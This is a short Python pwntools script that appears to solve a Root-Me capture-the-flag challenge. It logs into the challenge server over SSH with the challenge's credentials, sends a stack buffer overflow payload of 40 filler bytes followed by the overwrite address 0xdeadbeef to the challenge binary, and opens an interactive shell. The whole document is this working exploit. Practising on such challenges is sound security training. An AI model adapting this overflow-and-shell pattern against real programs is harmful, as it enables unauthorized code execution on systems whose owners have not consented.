from pwn import *

target = ssh(host='challenge02.root-me.org', port=2222, user='app-systeme-ch13', password='app-systeme-ch13')

# Create a payload consisting of 40 A characters followed by the address 0xdeadbeef
overflow = b"A"*40
address = p32(0xdeadbeef)
payload = overflow + address

# Start a process with the binary file and the payload
try:
    sh = target.process(['/challenge/app-systeme/ch13/ch13'])
    sh.send(payload)
    sh.interactive()
except Exception as e:
    print("Error:", e)
    target.close()
                   
